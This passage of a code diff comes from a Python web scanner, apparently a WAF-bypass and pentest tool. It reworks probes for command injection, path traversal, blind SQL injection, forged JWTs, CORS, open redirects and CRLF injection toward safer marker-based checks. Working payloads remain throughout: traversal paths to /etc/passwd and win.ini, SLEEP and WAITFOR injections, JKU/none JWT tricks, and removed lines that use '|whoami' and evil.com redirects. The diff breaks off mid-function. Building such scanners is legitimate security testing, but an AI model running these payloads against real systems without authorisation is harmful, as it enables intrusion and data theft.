-        results = self._batch_test(test_cases)
-        raw = ["|dir", "&dir", "|whoami", "|type c:\\windows\\win.ini", "&hostname"]
-        results += self._fuzz_param_endpoints(raw, 'CmdInj Win (param)', category='INJECTION')
+        """Windows command injection with harmless randomized output proof."""
+        token = f"BT{random.randrange(10**10, 10**11 - 1)}"
+        raw = [f'& echo {token}', f'| echo {token}', f'&& echo {token}',
+               f'|| echo {token}', f'& cmd /c echo {token}']
+        test_cases = []
+        for payload in raw:
+            test_cases.append({
+                'headers': {}, 'path': '/?' + urlencode({'cmd': payload}),
+                'technique': f'Command injection (Windows) [{payload[:24]}]',
+                'category': 'INJECTION', 'parameter': 'cmd', 'payload': payload,
+                'detector_id': 'command-output-marker-v2',
+                'oracle': {
+                    'type': 'marker', 'value': token, 'payload': payload,
+                    'severity': 'HIGH',
+                    'reason': f'Command output marker returned: {token}',
+                },
+            })
+        results = [r for r in self._batch_test(test_cases)
+                   if self._result_has_evidence(r, 'execution_marker')]
+        fuzzed = self._fuzz_param_endpoints(
+            raw, 'Command injection (Windows)', category='INJECTION',
+            oracle={
+                'type': 'marker', 'value': token, 'severity': 'HIGH',
+                'reason': f'Command output marker returned: {token}',
+            }, detector_id='command-output-marker-v2',
+        )
+        results.extend(r for r in fuzzed
+                       if self._result_has_evidence(r, 'execution_marker'))
         return results
 
     def _test_path_traversal_bypass(self) -> List[Dict[str, Any]]:
-        """Directory traversal evasion - OS aware, optimized batch"""
+        """Directory traversal requiring target-file signatures, not route deltas."""
         # Check detected OS and use appropriate payloads
         detected_os = getattr(self, '_detected_os', 'unknown')
         
@@ -3651,8 +4458,6 @@ class CloudFrontBypasser(ExtraTechniques):
                 "/..%c0%af..%c0%af/etc/passwd",
                 "/../../../etc/passwd%00",
                 "/....//....//....//etc/passwd",
-                "/../../../etc/shadow",
-                "/../../../proc/self/environ",
                 "/..%252f..%252f..%252fetc/passwd",
             ])
         
@@ -3670,18 +4475,52 @@ class CloudFrontBypasser(ExtraTechniques):
                 "/%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
             ])
         
-        test_cases = [
-            {'headers': {}, 'path': path, 'technique': f'Path Traversal: {path[:30]}'}
-            for path in traversal_paths
+        unix_patterns = [r'(?m)^root:[^:\r\n]*:0:0:', r'(?m)^daemon:[^:\r\n]*:\d+:\d+:']
+        windows_patterns = [
+            r'(?im)^\s*\[(?:fonts|extensions|mci extensions|files)\]\s*$',
+            r'(?im)^\s*127\.0\.0\.1\s+localhost(?:\s|$)',
         ]
-        results = self._batch_test(test_cases)
+        test_cases = []
+        for path in traversal_paths:
+            windows = 'windows' in path.lower() or 'win.ini' in path.lower()
+            test_cases.append({
+                'headers': {}, 'path': path,
+                'technique': f'Path traversal: {path[:38]}',
+                'category': 'INJECTION', 'payload': path,
+                'insertion_point': {'type': 'path', 'name': 'path'},
+                'detector_id': 'path-traversal-file-signature-v2',
+                'control': {
+                    'method': 'GET',
+                    'path': f'/blackthorn-missing-{random.randrange(10**8, 10**9)}.txt',
+                    'headers': {}, 'data': None,
+                },
+                'oracle': {
+                    'type': 'regex',
+                    'patterns': windows_patterns if windows else unix_patterns,
+                    'severity': 'HIGH',
+                    'reason': ('Known operating-system file signature returned only '
+                               'for the traversal probe'),
+                },
+            })
+        results = [r for r in self._batch_test(test_cases)
+                   if self._result_has_evidence(r, 'response_signature')]
         raw = [
             "../../../etc/passwd", "..%2f..%2f..%2fetc/passwd",
             "%2e%2e%2f%2e%2e%2fetc/passwd", "....//....//etc/passwd",
             "../../../windows/win.ini",
         ]
         raw += self.custom_payloads.get('path_traversal', [])
-        results += self._fuzz_param_endpoints(raw, 'Path Traversal (param)', category='INJECTION')
+        fuzzed = self._fuzz_param_endpoints(
+            raw, 'Path traversal', category='INJECTION',
+            oracle={
+                'type': 'regex', 'patterns': unix_patterns + windows_patterns,
+                'severity': 'HIGH',
+                'reason': ('Known operating-system file signature returned only '
+                           'for the traversal probe'),
+            }, detector_id='path-traversal-file-signature-v2',
+        )
+        results.extend(r for r in fuzzed
+                       if self._result_has_evidence(r, 'response_signature'))
         return results
     
     def _test_ssrf_bypass(self) -> List[Dict[str, Any]]:
@@ -3720,12 +4559,12 @@ class CloudFrontBypasser(ExtraTechniques):
             # Quick burst test
             responses = []
             for i in range(10):
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     self.target,
                     timeout=self.timeout,
                     allow_redirects=False
                 )
-                if resp:
+                if resp is not None:
                     responses.append({
                         'status': resp.status_code,
                         'size': len(resp.content),
@@ -3798,8 +4637,8 @@ class CloudFrontBypasser(ExtraTechniques):
                 }
                 
                 try:
-                    resp = safe_request(ipv6_url, headers=headers, timeout=self.timeout)
-                    if resp:
+                    resp = self._scoped_safe_request(ipv6_url, headers=headers, timeout=self.timeout)
+                    if resp is not None:
                         bypass_result = self._is_bypass(resp)
                         result = {
                             'technique': f'IPv6 Bypass: {ipv6_addr}',
@@ -3849,15 +4688,27 @@ class CloudFrontBypasser(ExtraTechniques):
             for path in api_paths
         ]
         results = []
-        batch_results = self._batch_test(test_cases)
+        batch_results = self._batch_test(test_cases, include_observations=True)
         
         for r in batch_results:
+            if r.get('status') not in (200, 201, 204, 301, 302, 307, 401, 403):
+                continue
             r['category'] = 'API_DISCOVERY'
+            r['bypass'] = False
+            r['kind'] = 'observation'
+            r['verification_status'] = 'informational'
+            r['confidence'] = 'high'
+            r['severity'] = 'INFO'
+            r['reason'] = f"API candidate responded with HTTP {r.get('status', 0)}"
+            r['evidence'] = [{
+                'type': 'route_response', 'description': r['reason'],
+                'matched': str(r.get('status', 0)),
+            }]
             results.append(r)
             
         return results
     
-    def _enumerate_subdomains(self) -> List[Dict[str, Any]]:
+    def _legacy_enumerate_subdomains(self) -> List[Dict[str, Any]]:
         """Basic subdomain enumeration"""
         print("  [*] Enumerating subdomains...")
         results = []
@@ -3892,7 +4743,7 @@ class CloudFrontBypasser(ExtraTechniques):
         
         return results
 
-    def _historical_dns_lookup(self) -> List[Dict[str, Any]]:
+    def _legacy_historical_dns_lookup(self) -> List[Dict[str, Any]]:
         """Discover old IP addresses via DNS history"""
         print("  [*] Checking historical DNS records...")
         results = []
@@ -3923,7 +4774,7 @@ class CloudFrontBypasser(ExtraTechniques):
         
         return results
 
-    def _certificate_transparency_lookup(self) -> List[Dict[str, Any]]:
+    def _legacy_certificate_transparency_lookup(self) -> List[Dict[str, Any]]:
         """Enumerate subdomains via certificate transparency logs"""
         print("  [*] Checking certificate transparency logs...")
         results = []
@@ -3955,7 +4806,7 @@ class CloudFrontBypasser(ExtraTechniques):
         
         return results
 
-    def _test_cloud_metadata_enumeration(self) -> List[Dict[str, Any]]:
+    def _legacy_test_cloud_metadata_enumeration(self) -> List[Dict[str, Any]]:
         """Test access to cloud provider metadata endpoints"""
         print("  [*] Testing cloud metadata enumeration...")
         results = []
@@ -3982,14 +4833,14 @@ class CloudFrontBypasser(ExtraTechniques):
         
         return results
 
-    def _fingerprint_technology_stack(self) -> List[Dict[str, Any]]:
+    def _legacy_fingerprint_technology_stack(self) -> List[Dict[str, Any]]:
         """Fingerprint backend technology stack"""
         print("  [*] Fingerprinting technology stack...")
         results = []
         
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             tech_headers = {
@@ -4021,8 +4872,8 @@ class CloudFrontBypasser(ExtraTechniques):
             ]
             
             for path, tech in framework_paths:
-                test_resp = safe_request(f"{self.target}{path}", timeout=self.timeout)
-                if test_resp and test_resp.status_code in [200, 403]:
+                test_resp = self._scoped_safe_request(f"{self.target}{path}", timeout=self.timeout)
+                if test_resp is not None and test_resp.status_code in [200, 403]:
                     result = {
                         'technique': f'Tech Discovery: {tech}',
                         'bypass': test_resp.status_code == 200,
@@ -4059,12 +4910,12 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for payload_path, rule_prefix, rule_type in version_test_payloads:
             try:
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     f"{self.target}{payload_path}",
                     timeout=self.timeout,
                     allow_redirects=False
                 )
-                if resp and resp.status_code in [403, 406, 501]:
+                if resp is not None and resp.status_code in [403, 406, 501]:
                     body_lower = resp.text.lower()
                     
                     # Look for rule IDs in response
@@ -4127,8 +4978,8 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Detecting JavaScript-based WAF/Bot Protection...")
         
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             body_lower = resp.text.lower()
@@ -4186,7 +5037,7 @@ class CloudFrontBypasser(ExtraTechniques):
         return results
     
     def _test_graphql_bypass(self) -> List[Dict[str, Any]]:
-        """GraphQL-specific bypass testing - introspection, batching, complexity abuse"""
+        """Discover GraphQL capabilities without calling normal behavior a bypass."""
         results = []
         print("  [*] Testing GraphQL bypass techniques...")
         
@@ -4198,28 +5049,20 @@ class CloudFrontBypasser(ExtraTechniques):
         # Batching attack - multiple queries in one request
         batch_query = '[{"query": "{ __typename }"}, {"query": "{ __schema { types { name } } }"}]'
         
-        # Complexity/DoS attack - deeply nested query
-        complexity_query = '{"query": "{ users { friends { friends { friends { name } } } } }"}'
-        
         # Field suggestion abuse
         field_probe = '{"query": "{ user { __tyepname } }"}'  # Intentional typo for suggestions
-        
-        # Alias abuse for rate limit bypass
-        alias_query = '{"query": "{ a1:user(id:1){id} a2:user(id:2){id} a3:user(id:3){id} }"}'
         
         graphql_tests = [
             (introspection_query, 'GraphQL Introspection'),
             (batch_query, 'GraphQL Batching'),
-            (complexity_query, 'GraphQL Complexity Abuse'),
             (field_probe, 'GraphQL Field Suggestion'),
-            (alias_query, 'GraphQL Alias Abuse'),
         ]
         
         for endpoint in graphql_endpoints:
             for query, technique in graphql_tests:
                 try:
-                    resp = self._session.post(
-                        f"{self.target}{endpoint}",
+                    resp = self._scoped_safe_request(
+                        f"{self.target}{endpoint}", method='POST',
                         data=query,
                         headers={
                             'Content-Type': 'application/json',
@@ -4229,21 +5072,38 @@ class CloudFrontBypasser(ExtraTechniques):
                         verify=False
                     )
                     
-                    if resp and resp.status_code == 200:
+                    if resp is not None and resp.status_code == 200:
                         try:
                             json_resp = resp.json()
-                            # Check if we got actual data (not just errors)
-                            if 'data' in json_resp and json_resp['data'] is not None:
+                            has_data = isinstance(json_resp, dict) and json_resp.get('data') is not None
+                            has_errors = isinstance(json_resp, dict) and bool(json_resp.get('errors'))
+                            if has_data or has_errors:
                                 result = {
                                     'technique': f'{technique}: {endpoint}',
-                                    'bypass': True,
+                                    'bypass': False,
                                     'status': resp.status_code,
-                                    'reason': 'GraphQL endpoint accessible',
-                                    'severity': 'HIGH' if 'introspection' in technique.lower() else 'MEDIUM',
-                                    'category': 'GRAPHQL_BYPASS'
+                                    'reason': ('GraphQL capability observed; this is normal '
+                                               'behavior unless a target policy says otherwise'),
+                                    'severity': 'INFO', 'category': 'GRAPHQL_BYPASS',
+                                    'kind': 'observation',
+                                    'verification_status': 'informational',
+                                    'confidence': 'high', 'method': 'POST',
+                                    'path': endpoint, 'url': f'{self.target}{endpoint}',
+                                    'request': {'method': 'POST',
+                                                'url': f'{self.target}{endpoint}',
+                                                'path': endpoint,
+                                                'headers': {'Content-Type': 'application/json'},
+                                                'body': query},
+                                    'response': {'status': resp.status_code,
+                                                 'content_type': resp.headers.get('Content-Type', '')},
+                                    'evidence': [{
+                                        'type': 'graphql_capability',
+                                        'description': technique,
+                                        'matched': 'data' if has_data else 'errors',
+                                    }],
                                 }
                                 results.append(result)
-                                print(f"  [✓] BYPASS: {technique} | Endpoint: {endpoint}")
+                                print(f"  [i] {technique} supported at {endpoint}")
                         except:
                             pass
                             
@@ -4253,7 +5113,7 @@ class CloudFrontBypasser(ExtraTechniques):
         return results
     
     def _test_jwt_oauth_bypass(self) -> List[Dict[str, Any]]:
-        """JWT/OAuth token bypass testing"""
+        """Require a forged JWT to cross a real invalid-token auth boundary."""
         results = []
         print("  [*] Testing JWT/OAuth bypass techniques...")
         
@@ -4275,44 +5135,28 @@ class CloudFrontBypasser(ExtraTechniques):
             {'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Qvandrcy5qc29uIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.test', 'technique': 'JWT JKU Injection'},
         ]
         
-        # OAuth bypass techniques
-        oauth_tests = [
-            {'redirect_uri': 'https://evil.com', 'technique': 'OAuth Open Redirect'},
-            {'scope': 'admin openid profile', 'technique': 'OAuth Scope Escalation'},
-            {'response_type': 'token', 'technique': 'OAuth Implicit Flow'},
-        ]
-        
         for test in jwt_tests:
             headers = {k: v for k, v in test.items() if k != 'technique'}
             technique = test['technique']
             
             result = self._test_request(
-                headers={**headers, 'X-Technique': technique},
-                method='GET',
-                path='/api/user'
+                headers=headers, method='GET', path='/api/user', technique=technique,
+                probe={
+                    'category': 'JWT_BYPASS',
+                    'payload': headers.get('Authorization', ''),
+                    'insertion_point': {'type': 'header', 'name': 'Authorization'},
+                    'detector_id': 'jwt-invalid-forged-auth-transition-v2',
+                    'control': {
+                        'method': 'GET', 'path': '/api/user',
+                        'headers': {'Authorization': 'Bearer blackthorn.invalid.token'},
+                        'data': None,
+                    },
+                },
             )
-            
-            if result:
-                result['category'] = 'JWT_BYPASS'
+            if (self._result_has_evidence(result, 'blocked_to_allowed')
+                    and (result.get('baseline') or {}).get('status') in (401, 403)):
                 results.append(result)
-                if result.get('bypass'):
-                    print(f"  [✓] BYPASS: {technique} | {result['reason']}")
-        
-        # Test OAuth endpoints
-        oauth_paths = ['/oauth/authorize', '/auth/authorize', '/oauth2/authorize']
-        for oauth_test in oauth_tests:
-            technique = oauth_test.pop('technique')
-            params = urlencode(oauth_test)
-            for path in oauth_paths:
-                result = self._test_request(
-                    headers={'X-Technique': technique},
-                    method='GET',
-                    path=f'{path}?{params}'
-                )
-                if result:
-                    result['category'] = 'OAUTH_BYPASS'
-                    results.append(result)
-        
+                print(f"  [✓] JWT auth boundary bypass: {technique}")
         return results
 
     # ============================================================================
@@ -4515,48 +5359,123 @@ class CloudFrontBypasser(ExtraTechniques):
         return results
     
     def _test_time_based_detection(self) -> List[Dict[str, Any]]:
-        """Time-based blind detection through response timing analysis"""
+        """Confirm blind SQL injection with repeated, paired delay controls.
+
+        This deliberately avoids CPU-heavy BENCHMARK payloads.  Safe mode skips
+        the technique because even a short database sleep consumes server work.
+        """
+        print("  [*] Testing paired time-based SQL injection...")
         results = []
-        print("  [*] Testing time-based blind detection...")
-        
-        # Time-based SQL injection payloads
-        timing_payloads = [
-            "/?id=1' AND SLEEP(2)--",
-            "/?id=1' AND BENCHMARK(5000000,SHA1('test'))--",
-            "/?id=1'; WAITFOR DELAY '0:0:2'--",
-            "/?id=1' AND pg_sleep(2)--",
+
+        targets = self._injection_targets()[:1]
+        if targets:
+            endpoint = targets[0]
+            params = endpoint.get('params') or {}
+            parameter = next(iter(params), 'id') if isinstance(params, dict) else 'id'
+            base_path = endpoint.get('path') or '/'
+        else:
+            parameter, base_path = 'id', '/'
+
+        def with_value(path: str, value: str) -> str:
+            parts = urlsplit(path)
+            pairs = parse_qsl(parts.query, keep_blank_values=True)
+            replaced = False
+            output = []
+            for key, current in pairs:
+                if key == parameter and not replaced:
+                    output.append((key, value))
+                    replaced = True
+                else:
+                    output.append((key, current))
+            if not replaced:
+                output.append((parameter, value))
+            return urlunsplit(('', '', parts.path or '/', urlencode(output), parts.fragment))
+
+        payload_pairs = [
+            ('MySQL', "1' AND SLEEP(2)-- ", "1' AND SLEEP(0)-- "),
+            ('PostgreSQL', "1';SELECT pg_sleep(2)--", "1';SELECT pg_sleep(0)--"),
+            ('SQL Server', "1';WAITFOR DELAY '0:0:2'--", "1';WAITFOR DELAY '0:0:0'--"),
         ]
-        
-        # Baseline timing
-        try:
-            start = time.time()
-            resp = safe_request(self.target, timeout=self.timeout)
-            baseline_time = time.time() - start
-            
-            for payload_path in timing_payloads:
-                start = time.time()
-                resp = safe_request(
-                    f"{self.target}{payload_path}",
-                    timeout=self.timeout + 5  # Extended timeout for sleep payloads
-                )
-                elapsed = time.time() - start
-                
-                # If response took significantly longer (2+ seconds more than baseline)
-                if elapsed > baseline_time + 1.5:
-                    result = {
-                        'technique': f'Time-Based Detection: {payload_path[:30]}',
-                        'bypass': True,
-                        'status': resp.status_code if resp else 0,
-                        'reason': f'Response delayed by {elapsed - baseline_time:.1f}s',
-                        'severity': 'CRITICAL',
-                        'category': 'TIME_BASED'
-                    }
-                    results.append(result)
-                    print(f"  [✓] BYPASS: Time-based SQLi detected | Delay: {elapsed:.1f}s")
-                    
-        except Exception as e:
-            logger.debug(f"Time-based detection error: {e}")
-        
+
+        for engine, attack_payload, control_payload in payload_pairs:
+            attack_path = with_value(base_path, attack_payload)
+            control_path = with_value(base_path, control_payload)
+            attack_times, control_times = [], []
+            status = 0
+            try:
+                # Alternate ordering to reduce false positives from monotonic
+                # load changes between the first and second half of the test.
+                for round_index in range(2):
+                    order = [('control', control_path), ('attack', attack_path)]
+                    if round_index % 2:
+                        order.reverse()
+                    round_values = {}
+                    for label, path in order:
+                        started = time.monotonic()
+                        response = self._scoped_safe_request(
+                            self._path_url(path), timeout=self.timeout + 4,
+                            allow_redirects=False,
+                        )
+                        elapsed = time.monotonic() - started
+                        if response is None:
+                            round_values = {}
+                            break
+                        status = response.status_code
+                        round_values[label] = elapsed
+                    if len(round_values) == 2:
+                        control_times.append(round_values['control'])
+                        attack_times.append(round_values['attack'])
+            except Exception as exc:
+                logger.debug(f"Paired timing test error ({engine}): {exc}")
+
+            if len(attack_times) != 2 or len(control_times) != 2:
+                continue
+            deltas = [attack - control for attack, control
+                      in zip(attack_times, control_times)]
+            median_delta = sum(sorted(deltas)) / 2.0
+            if median_delta < 1.4 or any(delta < 1.2 for delta in deltas):
+                continue
+
+            fingerprint = hashlib.sha256(
+                f"{urlparse(self.target).netloc}|GET|{urlsplit(base_path).path}|"
+                f"TIME_BASED|{parameter}|{engine}".encode()
+            ).hexdigest()[:24]
+            result = {
+                'technique': f'Time-based SQL injection ({engine})',
+                'bypass': True, 'status': status, 'severity': 'HIGH',
+                'category': 'INJECTION', 'kind': 'finding',
+                'verification_status': 'confirmed', 'confidence': 'high',
+                'reason': (f'Two paired probes delayed by {median_delta:.2f}s median '
+                           f'({deltas[0]:.2f}s, {deltas[1]:.2f}s)'),
+                'method': 'GET', 'path': attack_path,
+                'url': self._path_url(attack_path), 'payload': attack_payload,
+                'parameter': parameter,
+                'insertion_point': {'type': 'query', 'name': parameter},
+                'request': {'method': 'GET', 'url': self._path_url(attack_path),
+                            'path': attack_path, 'headers': {}, 'body': None},
+                'response': {'status': status},
+                'baseline': {'scope': 'paired', 'request': {
+                    'method': 'GET', 'url': self._path_url(control_path),
+                    'path': control_path, 'headers': {}, 'body': None,
+                }, 'timings_seconds': [round(v, 3) for v in control_times]},
+                'comparison': {
+                    'attack_timings_seconds': [round(v, 3) for v in attack_times],
+                    'control_timings_seconds': [round(v, 3) for v in control_times],
+                    'deltas_seconds': [round(v, 3) for v in deltas],
+                },
+                'evidence': [{
+                    'type': 'paired_timing_delay',
+                    'description': 'Repeated attack/control timing differential',
+                    'matched': f'{median_delta:.2f}s median delay',
+                }],
+                'detector_id': 'sqli-paired-timing-v2',
+                'fingerprint': fingerprint, 'finding_id': f'bt-{fingerprint}',
+                '_no_reconfirm': True,
+            }
+            result['curl'] = build_curl('GET', result['url'], self._session.headers)
+            results.append(result)
+            print(f"  [✓] HIGH: paired time-based SQLi ({engine}, {parameter})")
+
         return results
     
     def _test_race_condition(self) -> List[Dict[str, Any]]:
@@ -4580,8 +5499,8 @@ class CloudFrontBypasser(ExtraTechniques):
             def make_request():
                 try:
                     start = time.time()
-                    resp = self._session.post(
-                        f"{self.target}{endpoint}",
+                    resp = self._scoped_safe_request(
+                        f"{self.target}{endpoint}", method='POST',
                         data={'amount': '1'},
                         timeout=self.timeout,
                         verify=False
@@ -4637,218 +5556,166 @@ class CloudFrontBypasser(ExtraTechniques):
     # ============================================================================
     
     def _test_cors_misconfiguration(self) -> List[Dict[str, Any]]:
-        """Test for CORS misconfigurations that could allow unauthorized cross-origin access"""
+        """Apply browser-accurate CORS semantics and separate policy from impact."""
         results = []
-        print("  [*] Testing CORS misconfiguration...")
-        
-        cors_tests = [
-            # Test null origin
-            {'Origin': 'null'},
-            # Test wildcard reflection
-            {'Origin': 'https://evil.com'},
-            # Test subdomain bypass
-            {'Origin': f'https://evil.{self.domain}'},
-            # Test prefix bypass
-            {'Origin': f'https://{self.domain}.evil.com'},
-            # Test suffix bypass
-            {'Origin': f'https://evil{self.domain}'},
-            # Test protocol downgrade
-            {'Origin': f'http://{self.domain}'},
-            # Test with credentials
-            {'Origin': 'https://attacker.com'},
-        ]
-        
-        for test_headers in cors_tests:
+        print("  [*] Testing CORS policy with controlled origins...")
+        token = random.randrange(10**8, 10**9)
+        controlled = f'https://blackthorn-{token}.invalid'
+        host = urlparse(self.target).hostname or self.domain
+        origins = ['null', controlled, f'https://{host}.blackthorn.invalid']
+
+        for origin in origins:
             try:
-                resp = safe_request(
-                    self.target,
-                    timeout=self.timeout,
-                    allow_redirects=False,
-                    headers=test_headers
+                resp = self._scoped_safe_request(
+                    self.target, timeout=self.timeout, allow_redirects=False,
+                    headers={'Origin': origin},
                 )
-                
-                if resp:
-                    acao = resp.headers.get('Access-Control-Allow-Origin', '')
-                    acac = resp.headers.get('Access-Control-Allow-Credentials', '')
-                    
-                    origin_sent = test_headers['Origin']
-                    
-                    # Check for dangerous CORS configurations
-                    is_vulnerable = False
-                    reason = ""
-                    severity = "INFO"
-                    
-                    if acao == '*':
-                        is_vulnerable = True
-                        reason = "Wildcard (*) ACAO header - allows any origin"
-                        severity = "MEDIUM"
-                    elif acao == origin_sent and origin_sent != f'https://{self.domain}':
-                        is_vulnerable = True
-                        reason = f"Origin reflected: {origin_sent}"
-                        severity = "HIGH" if acac.lower() == 'true' else "MEDIUM"
-                    elif acao == 'null':
-                        is_vulnerable = True
-                        reason = "Null origin allowed"
-                        severity = "HIGH"
-                    
-                    if is_vulnerable:
-                        result = {
-                            'technique': f'CORS Misconfiguration: {origin_sent[:30]}',
-                            'bypass': True,
-                            'status': resp.status_code,
-                            'reason': reason,
-                            'severity': severity,
-                            'category': 'CORS_MISCONFIG',
-                            'details': {'acao': acao, 'acac': acac, 'origin_tested': origin_sent}
-                        }
-                        results.append(result)
-                        print(f"  [✓] CORS Vuln: {reason}")
-                        
-            except Exception as e:
-                logger.debug(f"CORS test error: {e}")
-        
+                if resp is None:
+                    continue
+                acao = resp.headers.get('Access-Control-Allow-Origin', '').strip()
+                acac = resp.headers.get('Access-Control-Allow-Credentials', '').strip().lower()
+
+                # Wildcard ACAO cannot be used by a credentialed browser request.
+                # Record it only as normal public-resource policy context.
+                if acao == '*':
+                    results.append({
+                        'technique': 'CORS wildcard policy', 'bypass': False,
+                        'status': resp.status_code,
+                        'reason': ('Wildcard ACAO observed; browsers reject wildcard '
+                                   'credentialed reads, so this alone is not a vulnerability'),
+                        'severity': 'INFO', 'category': 'CORS_MISCONFIG',
+                        'kind': 'observation', 'verification_status': 'informational',
+                        'confidence': 'high',
+                        'details': {'acao': acao, 'acac': acac, 'origin_tested': origin},
+                    })
+                    continue
+
+                if acao != origin:
+                    continue
+
+                credentialed = acac == 'true'
+                protected_transition = False
+                if credentialed:
+                    try:
+                        anonymous = self._recon_session.get(
+                            self.target, headers={'Origin': origin}, timeout=self.timeout,
+                            allow_redirects=False, verify=False,
+                        )
+                        protected_transition = (
+                            anonymous.status_code in (401, 403)
+                            and 200 <= resp.status_code < 400
+                        )
+                    except Exception:
+                        protected_transition = False
+
+                confirmed = credentialed and protected_transition
+                reason = (
+                    'Arbitrary origin can read a credentialed response that is denied anonymously'
+                    if confirmed else
+                    ('Arbitrary origin is reflected with credentials; verify that the '
+                     'endpoint returns sensitive data' if credentialed else
+                     'Arbitrary origin is allowed without credentials; impact depends on public data')
+                )
+                severity = 'HIGH' if confirmed else ('MEDIUM' if credentialed else 'LOW')
+                result = {
+                    'technique': f'CORS origin reflection: {origin[:40]}',
+                    'bypass': True, 'status': resp.status_code, 'reason': reason,
+                    'severity': severity, 'category': 'CORS_MISCONFIG',
+                    'kind': 'finding' if confirmed else 'suspected',
+                    'verification_status': 'confirmed' if confirmed else 'candidate',
+                    'confidence': 'high' if confirmed else 'medium',
+                    'method': 'GET', 'path': '/', 'url': self.target,
+                    'request': {'method': 'GET', 'url': self.target, 'path': '/',
+                                'headers': {'Origin': origin}, 'body': None},
+                    'response': {'status': resp.status_code, 'headers': {
+                        'access-control-allow-origin': acao,
+                        'access-control-allow-credentials': acac,
+                    }},
+                    'evidence': [{
+                        'type': ('credentialed_cross_origin_read' if confirmed
+                                 else 'cors_policy_reflection'),
+                        'description': reason,
+                        'matched': f'ACAO: {acao}; ACAC: {acac or "absent"}',
+                    }],
+                    'details': {'acao': acao, 'acac': acac,
+                                'origin_tested': origin},
+                    '_no_reconfirm': True,
+                }
+                results.append(result)
+                print(f"  [{'✓' if confirmed else '!'}] CORS: {reason}")
+            except Exception as exc:
+                logger.debug(f"CORS test error: {exc}")
         return results
     
     def _test_open_redirect(self) -> List[Dict[str, Any]]:
-        """Test for open redirect vulnerabilities"""
-        results = []
-        print("  [*] Testing open redirect...")
-        
-        redirect_payloads = [
-            # Common redirect parameters
-            ('?redirect=https://evil.com', 'redirect param'),
-            ('?url=https://evil.com', 'url param'),
-            ('?next=https://evil.com', 'next param'),
-            ('?return=https://evil.com', 'return param'),
-            ('?returnUrl=https://evil.com', 'returnUrl param'),
-            ('?return_url=https://evil.com', 'return_url param'),
-            ('?continue=https://evil.com', 'continue param'),
-            ('?dest=https://evil.com', 'dest param'),
-            ('?destination=https://evil.com', 'destination param'),
-            ('?redir=https://evil.com', 'redir param'),
-            ('?redirect_uri=https://evil.com', 'redirect_uri param'),
-            ('?target=https://evil.com', 'target param'),
-            ('?view=https://evil.com', 'view param'),
-            ('?to=https://evil.com', 'to param'),
-            ('?out=https://evil.com', 'out param'),
-            ('?go=https://evil.com', 'go param'),
-            ('?link=https://evil.com', 'link param'),
-            # Protocol-relative URL bypass
-            ('?redirect=//evil.com', 'protocol-relative'),
-            # Backslash bypass
-            ('?redirect=https://evil.com\\@legitimate.com', 'backslash bypass'),
-            # URL encoding bypass
-            ('?redirect=https%3A%2F%2Fevil.com', 'URL encoded'),
-            # Double URL encoding
-            ('?redirect=https%253A%252F%252Fevil.com', 'double encoded'),
-            # Whitespace bypass
-            ('?redirect= https://evil.com', 'leading space'),
-            ('?redirect=%20https://evil.com', 'encoded space'),
-            # Tab/newline bypass
-            ('?redirect=%09https://evil.com', 'tab bypass'),
-            ('?redirect=%0ahttps://evil.com', 'newline bypass'),
+        """Require Location to resolve to an exact controlled external host."""
+        print("  [*] Testing open redirects with parsed Location hosts...")
+        controlled = 'blackthorn.invalid'
+        target_host = urlparse(self.target).hostname or 'target'
+        values = [
+            f'https://{controlled}/callback',
+            f'//{controlled}/callback',
+            f'https://{target_host}@{controlled}/callback',
+            f'https://{target_host}.{controlled}/callback',
         ]
-        
-        for payload, technique in redirect_payloads:
-            try:
-                resp = safe_request(
-                    f"{self.target}{payload}",
-                    timeout=self.timeout,
-                    allow_redirects=False
-                )
-                
-                if resp and resp.status_code in [301, 302, 303, 307, 308]:
-                    location = resp.headers.get('Location', '')
-                    
-                    if 'evil.com' in location.lower() or location.startswith('//evil'):
-                        result = {
-                            'technique': f'Open Redirect: {technique}',
-                            'bypass': True,
-                            'status': resp.status_code,
-                            'reason': f'Redirects to: {location[:50]}',
-                            'severity': 'HIGH',
-                            'category': 'OPEN_REDIRECT',
-                            'details': {'payload': payload, 'location': location}
-                        }
-                        results.append(result)
-                        print(f"  [✓] Open Redirect: {technique} -> {location[:40]}")
-                        
-            except Exception as e:
-                logger.debug(f"Open redirect test error: {e}")
-        
+        parameters = [
+            'redirect', 'url', 'next', 'return', 'returnUrl', 'return_url',
+            'continue', 'dest', 'destination', 'redir', 'redirect_uri',
+            'target', 'view', 'to', 'out', 'go', 'link',
+        ]
+        allowed_hosts = [controlled, f'{target_host}.{controlled}']
+        test_cases = []
+        for parameter in parameters:
+            for value in values:
+                test_cases.append({
+                    'headers': {}, 'path': '/?' + urlencode({parameter: value}),
+                    'technique': f'Open redirect: {parameter}',
+                    'category': 'OPEN_REDIRECT', 'parameter': parameter,
+                    'payload': value, 'detector_id': 'open-redirect-location-v2',
+                    'oracle': {
+                        'type': 'redirect', 'hosts': allowed_hosts,
+                        'base_url': self.target, 'severity': 'HIGH',
+                        'reason': ('Location resolved to the exact controlled '
+                                   'external origin'),
+                    },
+                })
+        results = [
+            result for result in self._batch_test(test_cases)
+            if self._result_has_evidence(result, 'external_redirect')
+        ]
+        for result in results:
+            location = str((result.get('response') or {}).get('headers', {}).get('location', ''))
+            print(f"  [✓] Open Redirect: {result.get('parameter')} -> {location[:60]}")
         return results
     
     def _test_crlf_injection(self) -> List[Dict[str, Any]]:
-        """Test for CRLF injection (HTTP response splitting)"""
-        results = []
-        print("  [*] Testing CRLF injection...")
-        
-        crlf_payloads = [
-            # Standard CRLF
-            ('?param=test%0d%0aInjected-Header:injected', '%0d%0a'),
-            # Double CRLF for body injection
-            ('?param=test%0d%0a%0d%0a<html>injected</html>', 'body injection'),
-            # URL encoded variations
-            ('?param=test%0D%0AInjected:value', 'uppercase encoded'),
